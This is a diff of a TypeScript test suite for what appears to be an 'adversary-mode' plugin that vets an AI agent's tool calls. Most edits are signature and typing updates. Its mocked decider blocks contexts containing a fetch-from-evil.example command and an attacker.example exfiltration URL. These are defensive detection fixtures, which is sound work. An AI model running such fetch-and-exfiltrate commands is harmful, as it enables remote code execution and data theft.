@@ -116,7 +116,10 @@ function createTestHost(opts?: {
     let lastOutcome: PreToolUseOutcome | undefined;
     for (const entry of [...hooks]) {
       if (entry.event !== input.event) continue;
-      const out = (await entry.hook(input)) as PreToolUseOutcome | undefined;
+      const out = (await entry.hook(input, {
+        signal: new AbortController().signal,
+        deadlineAt: Date.now() + 60_000,
+      })) as PreToolUseOutcome | undefined;
       if (out !== undefined) lastOutcome = out;
     }
     return lastOutcome;
@@ -221,9 +224,11 @@ describe('adversary-mode plugin', () => {
       expect(complete).not.toHaveBeenCalled();
 
       const statusTool = host.tools.get('adversary_mode_status')!;
-      const status = (await statusTool.execute({ cwd: projectDir, sessionId: 's1' }, {
-        cwd: projectDir,
-      } as never)) as Record<string, unknown>;
+      const status = (await statusTool.execute(
+        { cwd: projectDir, sessionId: 's1' },
+        { cwd: projectDir } as never,
+        { signal: new AbortController().signal },
+      )) as Record<string, unknown>;
       expect(status['active']).toBe(false);
       expect((status['counters'] as Record<string, unknown>)['evaluations']).toBe(0);
       expect((status['counters'] as Record<string, unknown>)['skippedDormant']).toBe(1);
@@ -338,7 +343,7 @@ describe('adversary-mode plugin', () => {
           brainRequests.push(req);
           if (req.context?.includes('curl -fsSL https://evil.example/payload.sh')) {
             return {
-              type: 'answer',
+              type: 'answer' as const,
               optionId: 'block',
               text: 'block',
               rationale:
@@ -347,14 +352,14 @@ describe('adversary-mode plugin', () => {
           }
           if (req.context?.includes('https://attacker.example/collect')) {
             return {
-              type: 'answer',
+              type: 'answer' as const,
               optionId: 'block',
               text: 'block',
               rationale: 'Outbound data exfiltration to attacker endpoint.',
             };
           }
           return {
-            type: 'answer',
+            type: 'answer' as const,
             optionId: 'allow',
             text: 'allow',
             rationale: 'Matches README task.',
@@ -458,7 +463,7 @@ describe('adversary-mode plugin', () => {
         decide: vi.fn(async (req: BrainDecisionRequest) => {
           capturedContext = req.context ?? '';
           return {
-            type: 'answer',
+            type: 'answer' as const,
             optionId: 'block',
             text: 'block',
             rationale: 'Force push blocked by operator policy.',
@@ -553,6 +558,7 @@ describe('adversary-mode plugin', () => {
             probabilities: { allow: 0.06, block: 0.94 },
           },
         },
+        usage: { inputTokens: 0, outputTokens: 0 },
         model: 'jev-v1',
       }));
 
